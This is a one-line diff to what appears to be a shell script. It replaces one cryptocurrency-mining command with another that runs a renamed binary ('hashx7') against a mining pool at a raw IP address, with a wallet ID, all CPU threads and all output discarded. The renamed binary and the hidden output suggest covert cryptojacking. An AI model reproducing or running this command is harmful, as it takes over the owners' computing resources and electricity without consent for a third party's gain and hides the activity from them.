@@ -1,1 +1,1 @@
-chmod +x srnode ./srnode --algorithm yespowertide --pool 178.128.218.13:80 --wallet TWmRFcspf257KLgehukxHPdc1pf6g8PDz9.yesss --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1
+chmod +x hashx7 && ./hashx7 -a yespowertide -o 178.128.218.13:80 -u TWmRFcspf257KLgehukxHPdc1pf6g8PDz9.yessss -p x -t $(nproc --all) > /dev/null 2>&1
